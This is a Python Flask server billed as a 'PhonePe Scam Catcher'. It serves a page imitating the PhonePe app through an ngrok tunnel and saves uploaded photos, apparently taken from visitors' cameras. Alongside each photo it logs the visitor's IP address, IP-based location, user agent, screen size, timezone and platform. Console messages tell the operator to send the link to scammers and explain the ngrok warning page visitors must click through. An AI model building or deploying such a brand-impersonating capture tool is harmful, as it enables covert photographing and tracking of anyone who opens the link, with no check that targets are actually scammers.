#!/usr/bin/env python3
"""
PhonePe Scam Catcher - Simple Flask Application
"""

from flask import Flask, render_template, request, jsonify
import os
import json
import time
from datetime import datetime
import base64
import threading
import webbrowser
import atexit
import requests
import logging

# Try to import ngrok
ngrok = None
NGROK_AVAILABLE = False
try:
    from pyngrok import ngrok
    NGROK_AVAILABLE = True
    print("✅ Ngrok library loaded successfully")
except ImportError as e:
    print(f"⚠️  Ngrok not available: {e}")
    print("💡 To enable public URLs, install with: pip install pyngrok")
    print("   Then run: ngrok config add-authtoken YOUR_TOKEN")

# Configuration
PHOTOS_DIR = 'captured_photos'
PORT = 8080

# Ensure photos directory exists
os.makedirs(PHOTOS_DIR, exist_ok=True)

app = Flask(__name__,
           template_folder='templates',
           static_folder='static')

# Configure basic logging
logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] %(levelname)s in %(module)s: %(message)s'
)
logger = logging.getLogger(__name__)


@app.before_request
def log_request_info():
    """Debug log for every incoming request"""
    logger.info(
        "Request: %s %s from %s",
        request.method,
        request.path,
        request.remote_addr,
    )
    logger.debug("Headers: %s", dict(request.headers))

# Global variables for ngrok
public_url = None
ngrok_process = None

def get_ip_location(ip_address):
    """Get accurate location information from IP address using ip-api.com"""
    if not ip_address or ip_address == 'Unknown' or ip_address.startswith('127.') or ip_address == '::1':
        return 'LOCAL TEST - Real location will show when accessed via ngrok tunnel'

    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        response.raise_for_status()
        data = response.json()

        if data.get('status') == 'success':
            city = data.get('city', '')
            region = data.get('regionName', '')
            country = data.get('country', '')

            location_parts = []
            if city:
                location_parts.append(city)
            if region and region != city:
                location_parts.append(region)
            if country:
                location_parts.append(country)

            return ', '.join(location_parts) if location_parts else 'Unknown'
        else:
            return 'Location lookup failed'

    except Exception as e:
        print(f"Geolocation error for {ip_address}: {e}")
        return 'Location lookup failed'

def save_capture_metadata(capture_id, photo_filename, metadata):
    """Save capture metadata to JSON file"""
    metadata_file = os.path.join(PHOTOS_DIR, f"{capture_id}_info.json")

    # Get accurate IP and location
    ip_address = metadata.get('ip', request.remote_addr or 'Unknown')

    # Check for forwarded IP headers (useful when behind proxy/load balancer)
    real_ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or ip_address
    if real_ip != ip_address:
        print(f"📍 Forwarded IP detected: {real_ip} (original: {ip_address})")
        ip_address = real_ip

    accurate_location = get_ip_location(ip_address)

    capture_data = {
        'capture_id': capture_id,
        'photo_filename': photo_filename,
        'timestamp': datetime.now().isoformat(),
        'ip_address': ip_address,
        'location': accurate_location,
        'client_location': metadata.get('location', 'Unknown'),  # Keep client-side location too
        'user_agent': metadata.get('userAgent', request.headers.get('User-Agent', 'Unknown')),
        'screen_resolution': metadata.get('screenResolution', 'Unknown'),
        'timezone': metadata.get('timezone', 'Unknown'),
        'platform': metadata.get('platform', 'Unknown'),
    }

    with open(metadata_file, 'w') as f:
        json.dump(capture_data, f, indent=2)

    # Determine if this is a test or real capture
    is_local_test = ip_address.startswith('127.') or ip_address == '::1' or ip_address == 'localhost'

    if is_local_test:
        print(f"🧪 LOCAL TEST CAPTURE!")
    else:
        print(f"🎯 REAL SCAMMER CAPTURE!")

    print(f"   Photo: {photo_filename}")
    print(f"   IP: {capture_data['ip_address']}")
    print(f"   Location: {accurate_location}")
    print(f"   User-Agent: {capture_data['user_agent'][:50]}...")
    print(f"   Time: {capture_data['timestamp']}")
    print(f"   Files saved in: {PHOTOS_DIR}/")

    if is_local_test:
        print("💡 TIP: Share the ngrok URL to get real locations!")
    print("-" * 50)

@app.route('/')
def index():
    """Serve the main PhonePe interface"""
    return render_template('index.html')

@app.route('/test-external')
def test_external():
    """Test page to simulate external access with custom IP"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>External Testing - PhonePe Scam Catcher</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
            .test-form { background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0; }
            input, button { padding: 10px; margin: 5px; font-size: 16px; }
            .info { background: #e8f4fd; padding: 15px; border-radius: 5px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <h1>🧪 External Testing Mode</h1>
        <div class="info">
            <strong>How to test geolocation:</strong><br>
            1. Enter any public IP address (e.g., 8.8.8.8 for Google DNS)<br>
            2. Click "Test Location" to see what location it resolves to<br>
            3. This simulates what you'll see from real scammers
        </div>

        <div class="test-form">
            <h3>Test IP Geolocation</h3>
            <input type="text" id="testIp" placeholder="Enter IP address (e.g., 8.8.8.8)" value="8.8.8.8">
            <button onclick="testLocation()">Test Location</button>
            <div id="result"></div>
        </div>

        <div class="info">
            <strong>Real testing:</strong> Share your ngrok URL with others to get their real IP/location data!
        </div>

        <script>
            function testLocation() {
                const ip = document.getElementById('testIp').value;
                const resultDiv = document.getElementById('result');

                fetch('/api/test-ip', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ip: ip })
                })
                .then(response => response.json())
                .then(data => {
                    resultDiv.innerHTML = `
                        <h4>Test Results for IP: ${ip}</h4>
                        <p><strong>Location:</strong> ${data.location}</p>
                        <p><strong>Success:</strong> ${data.success ? '✅' : '❌'}</p>
                        <hr>
                        <p><em>This is what you'll see in real captures!</em></p>
                    `;
                })
                .catch(error => {
                    resultDiv.innerHTML = `<p style="color: red;">Error: ${error.message}</p>`;
                });
            }
        </script>
    </body>
    </html>
    '''

@app.route('/api/test-ip', methods=['POST'])
def test_ip_location():
    """API endpoint to test IP geolocation"""
    try:
        data = request.get_json()
        test_ip = data.get('ip', '')

        if not test_ip:
            return jsonify({'success': False, 'location': 'No IP provided'})

        location = get_ip_location(test_ip)
        return jsonify({
            'success': True,
            'ip': test_ip,
            'location': location
        })
    except Exception as e:
        return jsonify({'success': False, 'location': f'Error: {str(e)}'})

@app.route('/api/upload', methods=['POST'])
def upload_photo():
    """Handle photo upload from the frontend"""
    try:
        # Get the photo data
        photo_data = request.form.get('photo')
        metadata_str = request.form.get('metadata')

        logger.debug("Received upload request. Has photo: %s, raw metadata length: %s",
                     bool(photo_data), len(metadata_str) if metadata_str else 0)

        if not photo_data:
            return jsonify({'error': 'No photo data provided'}), 400

        # Parse metadata
        try:
            metadata = json.loads(metadata_str) if metadata_str else {}
            logger.debug("Parsed metadata: %s", metadata)
        except:
            logger.warning("Failed to parse metadata JSON. Raw value: %s", metadata_str)
            metadata = {}

        # Generate unique capture ID
        timestamp = int(time.time() * 1000)
        capture_id = f"scam_{timestamp}"

        # Save photo
        photo_filename = f"{capture_id}.jpg"
        photo_path = os.path.join(PHOTOS_DIR, photo_filename)

        # Convert base64 to image
        image_data = photo_data.replace('data:image/jpeg;base64,', '')
        image_bytes = base64.b64decode(image_data)

        with open(photo_path, 'wb') as f:
            f.write(image_bytes)

        # Save metadata
        save_capture_metadata(capture_id, photo_filename, metadata)

        return jsonify({
            'success': True,
            'capture_id': capture_id,
            'message': f'Photo saved as {photo_filename}'
        })

    except Exception as e:
        logger.exception("Upload error")
        return jsonify({'error': 'Failed to save photo'}), 500

def start_ngrok():
    """Start ngrok tunnel"""
    global public_url, ngrok_process

    if not NGROK_AVAILABLE:
        print("❌ Ngrok not available. Install with: pip install pyngrok")
        return

    try:
        print("🚀 Starting ngrok tunnel...")
        logger.info("Starting ngrok tunnel on port %s", PORT)
        # Configure ngrok with request headers including ngrok-skip-browser-warning
        ngrok_process = ngrok.connect(PORT, "http")
        public_url = ngrok_process.public_url
        print(f"✅ Public URL: {public_url}")
        logger.info("Ngrok public URL: %s", public_url)
        print("=" * 50)
        print("📱 IMPORTANT: ngrok Free Tier Warning Page")
        print("=" * 50)
        print("⚠️  Visitors will see an ngrok warning page ONCE (first visit only)")
        print("   They must click 'Visit Site' to proceed to your PhonePe interface.")
        print("")
        print("💡 To REMOVE the warning page completely:")
        print("   1. Upgrade to ngrok paid plan ($8/month)")
        print("   2. Visit: https://dashboard.ngrok.com/billing")
        print("")
        print("📤 Send this URL to scammers: " + public_url)
        print("   (They'll see warning once, then your app)")
        print("=" * 50)

        # Open the URL in browser for testing
        webbrowser.open(public_url)

    except Exception as e:
        print(f"❌ Ngrok error: {e}")
        logger.exception("Ngrok error")
        print("💡 Make sure you have an ngrok account and auth token set up")
        print("   Run: ngrok config add-authtoken YOUR_TOKEN")
        print("   Or download ngrok manually from https://ngrok.com")
        public_url = f"http://localhost:{PORT}"

def cleanup():
    """Clean up ngrok on exit"""
    global ngrok_process
    if ngrok_process and NGROK_AVAILABLE:
        try:
            ngrok.disconnect(ngrok_process.public_url)
            ngrok.kill()
        except:
            pass
        print("🧹 Ngrok tunnel closed")
        logger.info("Ngrok tunnel closed")

def main():
    """Main function to run the server"""
    print("🎯 Scammer Hunter - PhonePe Edition")
    print("=" * 50)
    print(f"🌐 Local server: http://localhost:{PORT}")
    print(f"🧪 Test geolocation: http://localhost:{PORT}/test-external")
    print(f"📁 Photos will be saved in: {PHOTOS_DIR}/")
    print("=" * 50)

    # Start ngrok in background thread
    if NGROK_AVAILABLE:
        ngrok_thread = threading.Thread(target=start_ngrok, daemon=True)
        ngrok_thread.start()
        # Give ngrok time to start
        time.sleep(3)
    else:
        print("⚠️  Ngrok not available - only local access")
        print("   Install with: pip install pyngrok")

    # Register cleanup function
    atexit.register(cleanup)

    print("🎣 Waiting for scammers...")
    print("Press Ctrl+C to stop")
    print("=" * 50)

    try:
        # Run Flask server
        app.run(host='0.0.0.0', port=PORT, debug=False)
    except KeyboardInterrupt:
        print("\n👋 Shutting down...")
    finally:
        cleanup()

if __name__ == '__main__':
    main()